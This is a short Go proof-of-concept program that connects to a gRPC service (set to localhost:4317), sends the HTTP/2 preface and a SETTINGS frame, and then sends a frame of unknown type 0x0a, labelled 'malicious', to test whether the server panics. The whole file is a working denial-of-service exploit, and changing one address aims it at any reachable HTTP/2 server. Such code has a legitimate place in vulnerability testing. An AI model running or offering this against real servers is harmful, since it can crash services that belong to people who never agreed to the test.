package main

import (
	"log"
	"net"
)

func main() {
	// Change to your gRPC service address
	conn, err := net.Dial("tcp", "localhost:4317")
	if err != nil {
		log.Fatal("dial error:", err)
	}
	defer conn.Close()

	// Send the HTTP/2 client preface first
	preface := []byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
	conn.Write(preface)

	// Send a minimal HTTP/2 SETTINGS frame (type 0x4) to init the connection
	settings := []byte{
		0x00, 0x00, 0x00, // length = 0
		0x04,                   // type = SETTINGS (0x4)
		0x00,                   // flags = none
		0x00, 0x00, 0x00, 0x00, // stream ID = 0
	}
	conn.Write(settings)

	// Now send the malicious frame with type 0x0a (or 0x0b through 0x0f)
	malicious := []byte{
		0x00, 0x00, 0x00, // length = 0 (empty payload)
		0x0a,                   // ← the problematic frame type
		0x00,                   // flags
		0x00, 0x00, 0x00, 0x00, // stream ID = 0
	}
	_, err = conn.Write(malicious)
	if err != nil {
		log.Fatal("write error:", err)
	}

	log.Println("Malicious frame sent — check if server panicked")
}
